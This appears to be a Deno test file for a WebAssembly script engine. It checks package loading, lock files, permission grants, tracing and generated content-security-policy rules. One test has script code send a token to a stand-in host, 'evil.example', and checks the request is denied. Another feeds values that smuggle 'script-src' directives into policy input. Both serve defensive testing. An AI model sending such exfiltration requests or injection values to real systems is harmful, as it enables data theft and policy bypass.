/* The engine under Deno with no browser, undeclared names fail and missing Web APIs name themselves. */
const BASE = Deno.env.get("EDGE_CDN_BASE")?.replace(/\/$/, "");
if (!BASE) throw new Error("set EDGE_CDN_BASE (make serve)");
const WASM = `${BASE}/edge.wasm`;

// A fresh engine per test, the query string keeps the module state apart.
async function fresh(name) {
    const at = (path) => new URL(`${path}?deno=${name}`, import.meta.url).href;
    const engine = await import(at("../src/worker/engine.ts"));
    const { default: net } = await import(at("../../examples/net/net.ts"));
    const { default: perms } = await import(at("../src/system/perms.ts"));
    return { engine, net, perms };
}

// the JS host's own composition with net under perms as its bundle wires them
async function boot(name, imports = {}, base = baseUrl) {
    const { engine, net, perms } = await fresh(name);
    engine.wire(net);
    engine.access(perms);
    await engine.load({ wasmUrl: WASM, imports, baseUrl: base });
    return engine;
}

// No manifest lives here, so bare names stay undeclared.
const baseUrl = new URL("./nomanifest/", import.meta.url).href;

// A packed package runs its entry and imports its own files from inside itself, the way a published one arrives.
Deno.test("deno: a packed package imports from inside itself", async () => {
    const enc = new TextEncoder();
    const framed = (bytes) => [...enc.encode(`${bytes.length}\n`), ...bytes];
    const files = { "main.mini": "from .src.hello import hello\n", "src/hello.mini": "fn hello(name):\n    return 'hello ' + name\n", "https://example.com/dep.edge": "" };
    const packed = [...enc.encode("EDGEPKG\x01"), ...framed(enc.encode("main.mini")), ...enc.encode(`${Object.keys(files).length}\n`)];
    for (const [path, text] of Object.entries(files)) packed.push(...framed(enc.encode(path)), ...framed(enc.encode(text)));
    const dir = await Deno.makeTempDir();
    await Deno.writeFile(`${dir}/greet.edge`, new Uint8Array(packed));
    const engine = await boot("package", { greet: new URL(`file://${dir}/greet.edge`).href });
    const lines = [];
    const { out } = await engine.run({ src: "from greet import hello\nprint(hello('edge'))" }, (t) => lines.push(t));
    if (out !== "" || lines.join("").trim() !== "hello edge") throw new Error(`unexpected ${JSON.stringify([out, lines])}`);
});

/* A published package declares its own dependency by version, so the host has to read the lock the package carries rather than ask a registry at run time. */
Deno.test("deno: a packed package resolves its own version through the lock it carries", async () => {
    const enc = new TextEncoder();
    const framed = (bytes) => [...enc.encode(`${bytes.length}\n`), ...bytes];
    const pack = (entry, files) => {
        const out = [...enc.encode("EDGEPKG\x01"), ...framed(enc.encode(entry)), ...enc.encode(`${Object.keys(files).length}\n`)];
        for (const [path, text] of Object.entries(files)) out.push(...framed(enc.encode(path)), ...framed(enc.encode(text)));
        return new Uint8Array(out);
    };
    const dir = await Deno.makeTempDir();
    const dep = pack("main.mini", { "main.mini": "fn shout(word):\n    return word.upper()\n" });
    await Deno.writeFile(`${dir}/dep.edge`, dep);
    const digest = [...new Uint8Array(await crypto.subtle.digest("SHA-256", dep))].map((b) => b.toString(16).padStart(2, "0")).join("");
    const url = new URL(`file://${dir}/dep.edge`).href;

    const app = pack("main.mini", {
        "main.mini": "from dep import shout\n\nfn greet(name):\n    return shout('hi ' + name)\n",
        "edge.json": JSON.stringify({ imports: { dep: "0.1.0" } }),
        "edge.lock": JSON.stringify({ dep: { version: "0.1.0", url, digest: `sha256-${digest}` } }),
    });
    await Deno.writeFile(`${dir}/app.edge`, app);

    const engine = await boot("lock", { app: new URL(`file://${dir}/app.edge`).href });
    const lines = [];
    const { out } = await engine.run({ src: "from app import greet\nprint(greet('edge'))" }, (t) => lines.push(t));
    if (out !== "" || lines.join("").trim() !== "HI EDGE") throw new Error(`unexpected ${JSON.stringify([out, lines])}`);
});

// a page has no lock command so a version no lock holds names the file
Deno.test("deno: a version no lock holds names the lock", async () => {
    const enc = new TextEncoder();
    const framed = (bytes) => [...enc.encode(`${bytes.length}\n`), ...bytes];
    const files = { "main.mini": "print(1)\n", "edge.json": JSON.stringify({ imports: { dep: "0.1.0" } }) };
    const out = [...enc.encode("EDGEPKG\x01"), ...framed(enc.encode("main.mini")), ...enc.encode(`${Object.keys(files).length}\n`)];
    for (const [path, text] of Object.entries(files)) out.push(...framed(enc.encode(path)), ...framed(enc.encode(text)));
    const dir = await Deno.makeTempDir();
    await Deno.writeFile(`${dir}/app.edge`, new Uint8Array(out));

    const engine = await boot("unlocked", { app: new URL(`file://${dir}/app.edge`).href });
    let failed = "";
    try {
        await engine.run({ src: "import app" });
    } catch (e) {
        failed = String(e);
    }
    if (!failed.includes("'dep' is not locked in edge.lock")) throw new Error(`unexpected ${JSON.stringify(failed)}`);
});

Deno.test("deno: an undeclared name fails at compile time", async () => {
    const engine = await boot("undeclared");
    const { out } = await engine.run({ src: "import json\nprint(1)" });
    if (!out.includes("module 'json' is not provided by this host and no edge.json declares it")) throw new Error(`unexpected output ${JSON.stringify(out)}`);
});

Deno.test("deno: send() names the actor scheduler it lacks", async () => {
    const engine = await boot("send");
    const lines = [];
    const missing = "send() needs an actor scheduler, missing in this runtime";
    const caught = await engine.run({ src: "try:\n    send('g', 'x')\nexcept RuntimeError as e:\n    print(e)" }, (t) => lines.push(t));
    if (caught.out !== "" || lines.join("").trim() !== missing) throw new Error(`unexpected ${JSON.stringify([caught.out, lines])}`);
    const { out } = await engine.run({ src: "send('g', 'x')" });
    if (!out.includes(missing) || !out.includes("<input>:1:1")) throw new Error(`unexpected output ${JSON.stringify(out)}`);
});

Deno.test("deno: a manifest beside a module joins its relative targets once", async () => {
    const dir = await Deno.makeTempDir();
    await Deno.mkdir(`${dir}/pkg`);
    await Deno.writeTextFile(`${dir}/edge.json`, JSON.stringify({ imports: { pkg: "./pkg/entry.mini" } }));
    await Deno.writeTextFile(`${dir}/pkg/edge.json`, JSON.stringify({ imports: { _impl: "./impl.mini" } }));
    await Deno.writeTextFile(`${dir}/pkg/entry.mini`, "from _impl import value\n");
    await Deno.writeTextFile(`${dir}/pkg/impl.mini`, "value = 42\n");
    const engine = await boot("facade", {}, `file://${dir}/`);
    const lines = [];
    const { out } = await engine.run({ src: "from pkg import value\nprint(value)" }, (t) => lines.push(t));
    await Deno.remove(dir, { recursive: true });
    if (out !== "" || lines.join("").trim() !== "42") throw new Error(`unexpected ${JSON.stringify([out, lines])}`);
});

/* A project on disk, the edge.json a run reads its grants from beside its files. */
async function project(files) {
    const dir = await Deno.makeTempDir();
    for (const [path, text] of Object.entries(files)) {
        const at = `${dir}/${path}`;
        await Deno.mkdir(at.slice(0, at.lastIndexOf("/")), { recursive: true });
        await Deno.writeTextFile(at, text);
    }
    return new URL(`file://${dir}/`).href;
}

// What a run printed and what it failed with, from a fresh engine.
async function output(name, src, base) {
    const engine = await boot(name, {}, base);
    const lines = [];
    const { out } = await engine.run({ src }, (t) => lines.push(t));
    return { out, text: lines.join("").trim() };
}

// No JavaScript loads besides the host's own, so an import of one fails where it is written.
Deno.test("deno: a JavaScript import is refused at compile time", async () => {
    const base = await project({ "edge.json": JSON.stringify({ imports: { charts: "./charts.js" } }), "charts.js": "export const draw = () => 1;\n" });
    const got = await output("javascript", "from charts import draw", base);
    if (!got.out.includes("module 'charts' is JavaScript, ship a .mini or a .wasm")) throw new Error(`unexpected ${JSON.stringify(got)}`);
});

// the cases both CLI hosts run here against the TypeScript module in Deno
const NET = await Deno.readTextFile(new URL("../../examples/net/cases.json", import.meta.url));

/* the answers the routes name on loopback allowing any origin as the CLI fixture does */
function fixture(routesOf) {
    const open = { "access-control-allow-origin": "*", "access-control-expose-headers": "*", "cache-control": "no-store" };
    const gzip = (text) => new Response(new Blob([text]).stream().pipeThrough(new CompressionStream("gzip"))).bytes();
    const joined = (parts) => new Uint8Array(parts.flatMap((part) => [...part]));
    // each part goes out in turn and every later one waits the gap first
    const gapped = (parts, gap) => {
        let [at, timer] = [0, 0];
        return new ReadableStream({
            async pull(controller) {
                if (at > 0) await new Promise((resolve) => { timer = setTimeout(resolve, gap); });
                controller.enqueue(new TextEncoder().encode(parts[at++]));
                if (at === parts.length) controller.close();
            },
            cancel() { clearTimeout(timer); },
        });
    };
    return Deno.serve({ hostname: "127.0.0.1", port: 0, onListen() {} }, async (req) => {
        const url = new URL(req.url);
        if (req.method === "OPTIONS") return new Response(null, { status: 204, headers: { ...open, "access-control-allow-methods": "*", "access-control-allow-headers": "*" } });
        const routes = routesOf();
        const at = Object.keys(routes).filter((route) => url.pathname === route || url.pathname.startsWith(`${route}/`)).sort((a, b) => b.length - a.length)[0];
        const route = at === undefined ? null : routes[at];
        if (!route) return new Response(null, { status: 404, headers: open });
        // a slow route answers only after its delay as the CLI fixture does
        if (route.delay) await new Promise((resolve) => setTimeout(resolve, route.delay));
        if (route.socket && req.headers.get("upgrade")?.toLowerCase() === "websocket") {
            const { socket, response } = Deno.upgradeWebSocket(req);
            socket.binaryType = "arraybuffer";
            socket.onmessage = (e) => (e.data === "close" ? socket.close() : socket.send(typeof e.data === "string" ? `echo ${e.data}` : e.data));
            return response;
        }
        let body = null;
        if (route.body !== undefined) body = route.body;
        else if (route.repeat) body = route.repeat[0].repeat(route.repeat[1]);
        else if (route.gzip) body = joined(await Promise.all(route.gzip.map(gzip)));
        else if (route.parts) body = gapped(route.parts, route.gap ?? 0);
        else if (route.echo) {
            const lines = [`${req.method} ${url.pathname}${url.search}\n`, ...route.echo.filter((name) => req.headers.has(name)).map((name) => `${name}: ${req.headers.get(name)}\n`)];
            body = joined([new TextEncoder().encode(lines.join("")), new Uint8Array(await req.arrayBuffer())]);
        }
        return new Response(body, { status: route.status ?? 200, headers: { ...open, ...Object.fromEntries(route.headers ?? []) } });
    });
}

/* what one case printed and failed with from a fresh engine over its own project */
async function play(at, name, c) {
    const base = await project(c.given);
    for (const [dest, src] of Object.entries(c.copy ?? {})) await Deno.writeFile(new URL(dest, base), await Deno.readFile(new URL(src, new URL("../../", import.meta.url))));
    const entry = c.run[1];
    const engine = await boot(name, {}, base);
    const lines = [];
    let out;
    try {
        ({ out } = await engine.run({ src: await Deno.readTextFile(new URL(entry, base)), entry }, (t) => lines.push(t)));
    } catch (e) {
        out = e.message;
    }
    const printed = lines.join("");
    const wrong = [];
    if (Boolean(c.fails) !== (out !== "")) wrong.push(`failed with ${JSON.stringify(out)}`);
    for (const want of c.fails ?? []) if (!out.includes(want)) wrong.push(`out missing ${JSON.stringify(want)}`);
    for (const want of c.stdout ?? []) if (!printed.includes(want)) wrong.push(`printed missing ${JSON.stringify(want)}`);
    return wrong.length ? `${at} ${entry}: ${wrong.join(", ")} in ${JSON.stringify(printed)} ${JSON.stringify(out)}` : null;
}

Deno.test("deno: the net conformance cases answer as the CLI hosts answer them", async () => {
    let routes = {};
    const server = fixture(() => routes);
    const origin = `127.0.0.1:${server.addr.port}`;
    const { routes: named, cases } = JSON.parse(NET.replaceAll("$FIXTURE", `http://${origin}`).replaceAll("$SOCKET", `ws://${origin}`));
    routes = named;
    const failed = [];
    try {
        for (const [at, c] of cases.entries()) {
            const wrong = await play(at, `net-${at}`, c);
            if (wrong) failed.push(wrong);
        }
    } finally {
        await server.shutdown();
    }
    if (failed.length) throw new Error(`\n${failed.join("\n")}`);
});

Deno.test("deno: the JS host's own bundle wires net under perms", async () => {
    const { default: composition } = await import("../src/worker/composition.ts");
    const { default: perms } = await import("../src/system/perms.ts");
    if (JSON.stringify(composition.modules.map((module) => module.name)) !== '["net"]' || composition.access !== perms) throw new Error(`unexpected ${JSON.stringify(composition)}`);
});

/* without perms nothing bounds a call and its holders are plain import names */
Deno.test("deno: a composition without perms gives every package each module it wired", async () => {
    const { engine, net } = await fresh("open");
    engine.wire(net);
    const refused = await engine.load({ wasmUrl: WASM, permissions: { main: ["net:127.0.0.1"] } }).then(() => "loaded", (e) => e.message);
    if (refused !== "permissions need a grant component and this composition wires none") throw new Error(`unexpected ${refused}`);
    const base = await project({ "edge.json": JSON.stringify({ imports: { main: "./lib.mini" }, permissions: "read by nobody" }), "lib.mini": "value = 7\n" });
    await engine.load({ wasmUrl: WASM, baseUrl: base });
    const lines = [];
    const src = "import net\nfrom main import value\n\nr = net.request('GET', 'http://127.0.0.1:1/')\ntry:\n    net.response(r)\nexcept OSError as e:\n    print(value, r > 0, 'unbounded')";
    const { out } = await engine.run({ src }, (t) => lines.push(t));
    if (out !== "" || lines.join("").trim() !== "7 True unbounded") throw new Error(`unexpected ${JSON.stringify([out, lines])}`);
});

/* a module of the test's own beside net shows only its name and outcome */
Deno.test("deno: a traced run reports each call as its module shows it", async () => {
    const { engine, net, perms } = await fresh("trace");
    const probe = { name: "probe", scope: () => true, reaches: () => null, open: () => ({ calls: { ping: (word) => `pong ${word}` }, close() {} }) };
    engine.wire(net, probe);
    engine.access(perms);
    await engine.load({ wasmUrl: WASM, trace: true, permissions: { main: ["net:127.0.0.1", "probe"] } });
    const events = [];
    const src = "import net\nimport probe\n\nprint(probe.ping('secret'))\ntry:\n    net.request('GET', 'https://evil.example/x?token=t-456')\nexcept PermissionError as e:\n    pass";
    const { out } = await engine.run({ src }, () => {}, (event) => events.push(event));
    const said = JSON.stringify(events);
    const call = (name) => events.find((event) => event.kind === "call" && event.call === name);
    if (out !== "" || events[0]?.kind !== "run" || !(events[0].epoch > 0)) throw new Error(`no run start leads ${said} ${out}`);
    if (JSON.stringify(Object.keys(call("probe.ping") ?? {})) !== '["kind","at","ms","pkg","call","scope","outcome"]' || call("probe.ping").scope !== "" || call("probe.ping").outcome !== "ok") throw new Error(`the probe showed more than its name in ${said}`);
    if (call("net.request")?.scope !== "GET evil.example/x" || call("net.request")?.outcome !== "denied" || call("net.request")?.pkg !== "main") throw new Error(`no refused request in ${said}`);
    if (said.includes("t-456") || said.includes("\"secret\"")) throw new Error(`an argument leaked into ${said}`);
    if (!events.some((event) => event.kind === "print" && event.text.includes("pong secret"))) throw new Error(`no print in ${said}`);
});

/* the room reaches what wired modules give granted scopes and nothing a policy cannot name */
Deno.test("deno: the room's policy reaches what the wired modules give the granted scopes", async () => {
    const { roomPolicy } = await import("../src/policy.ts");
    const { default: net } = await import("../../examples/net/net.ts");
    const { default: perms } = await import("../src/system/perms.ts");
    const connect = async (specs, composition) => (await roomPolicy(specs, section, composition)).split("; ").find((part) => part.startsWith("connect-src "));
    const section = { main: ["net:api.example.com/v2", "net", "net:a.test;script-src", "net:2130706433"], all: ["probe:anything"] };
    const probe = { name: "probe", scope: () => true, reaches: () => null, open: () => ({ calls: {}, close() {} }), origins: () => ["https://probe.test", "https://*.evil.test", "https://x.test; script-src *"] };
    const wired = await connect(["https://cdn.example.com/pkg/x.edge", "./local.mini"], { modules: [net, probe], access: perms });
    if (wired !== "connect-src https://cdn.example.com https://api.example.com:* http://api.example.com:* wss://api.example.com:* ws://api.example.com:* https://probe.test") throw new Error(`unexpected ${wired}`);
    const open = await connect(["https://cdn.example.com/pkg/x.edge"], { modules: [net, probe] });
    if (open !== "connect-src https://cdn.example.com") throw new Error(`a composition without perms widened ${open}`);
    const silent = await connect([], { modules: [{ ...net, origins: undefined }], access: perms });
    if (silent !== "connect-src 'none'") throw new Error(`a module with no origins widened ${silent}`);
});

// empty imports stand in for nothing so page and worker both read the base edge.json
Deno.test("deno: a page reads the edge.json at its base unless what it gives stands in for it", async () => {
    const { rootOf } = await import("../src/policy.ts");
    const base = await project({ "edge.json": JSON.stringify({ imports: { lib: "https://cdn.example.com/lib.mini" }, permissions: { main: ["net:a.test"] } }) });
    const read = await rootOf({ imports: {} }, base);
    if (JSON.stringify(read.specs) !== '["https://cdn.example.com/lib.mini"]' || JSON.stringify(read.manifest.permissions) !== '{"main":["net:a.test"]}') throw new Error(`unexpected ${JSON.stringify(read)}`);
    const given = await rootOf({ imports: { x: "https://other.test/x.mini" } }, base);
    if (JSON.stringify(given) !== '{"specs":["https://other.test/x.mini"],"manifest":{}}') throw new Error(`unexpected ${JSON.stringify(given)}`);
});

// only the root's file channel lines reach the page
Deno.test("deno: only the root package writes a file channel", async () => {
    const base = await project({
        "edge.json": JSON.stringify({ imports: { util: "./util/main.mini" }, permissions: { main: [] } }),
        "util/edge.json": "{}",
        "util/main.mini": "fn write():\n    send('file:report.txt', 'from util')\n",
        "main.mini": "import util\nsend('file:mine.txt', 'from main')\ntry:\n    util.write()\nexcept PermissionError as e:\n    print(e)\n",
    });
    const engine = await boot("sender", {}, base);
    const [lines, sent] = [[], []];
    const { out } = await engine.run({ src: await Deno.readTextFile(new URL("main.mini", base)), entry: "main.mini" }, (t) => lines.push(t), undefined, (channel, text) => sent.push([channel, text]));
    const refused = "'util' has no grant that reaches file:report.txt, only the root package writes a file channel without one\n";
    if (out !== "" || lines.join("") !== refused || JSON.stringify(sent) !== '[["file:mine.txt","from main"]]') throw new Error(`unexpected ${JSON.stringify([out, lines, sent])}`);
});
